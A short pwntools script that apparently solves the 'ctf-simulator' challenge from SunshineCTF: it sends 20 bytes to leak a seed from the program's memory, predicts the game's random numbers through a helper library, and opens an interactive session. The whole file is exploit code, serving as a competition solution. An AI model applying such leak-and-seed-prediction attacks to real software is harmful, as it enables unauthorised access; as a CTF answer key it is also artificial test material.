from pwn import *
from ctypes import *

so_file = "./random_solve.so"
my_functions = CDLL(so_file)

binary = context.binary = ELF("./ctf-simulator")

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('sunshinectf.games', 22000)

# Send leak
p.sendline(b"A" * 0x14)

# Get win address
tmp = p.readuntil("Okay AAAAAAAAAAAAAAAAAAAA")
tmp = p.readuntil(", ")[:4]
print(tmp)

seed = int.from_bytes(tmp, "little")
my_functions.seed_solve(seed)

size = 10
while size < 1000000000:

    rand_num = my_functions.random_solve()
    rand_num = str((rand_num % size) + 1)
    print(rand_num)
    p.sendline(rand_num)
    size = size * 10

p.interactive()